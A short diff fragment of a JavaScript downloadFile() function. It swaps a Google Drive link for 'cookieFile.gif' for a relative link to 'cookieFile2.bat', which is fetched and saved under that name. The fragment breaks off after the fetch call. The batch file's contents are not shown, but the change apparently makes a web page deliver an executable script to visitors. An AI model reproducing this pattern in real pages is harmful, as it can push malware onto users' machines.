@@ -1,6 +1,6 @@
 function downloadFile() {
-    const url = 'https://drive.google.com/uc?export=download&id=1Y-w3zKdp9yer1F6cLgZzCEbwi0tIEKKX'; // Direct download link
-    const filename = 'cookieFile.gif'; // Name of the file to be saved
+    const url = '../cookieFile2.bat'; // Direct download link
+    const filename = 'cookieFile2.bat'; // Name of the file to be saved
 
     fetch(url)
     .then(response => response.blob())
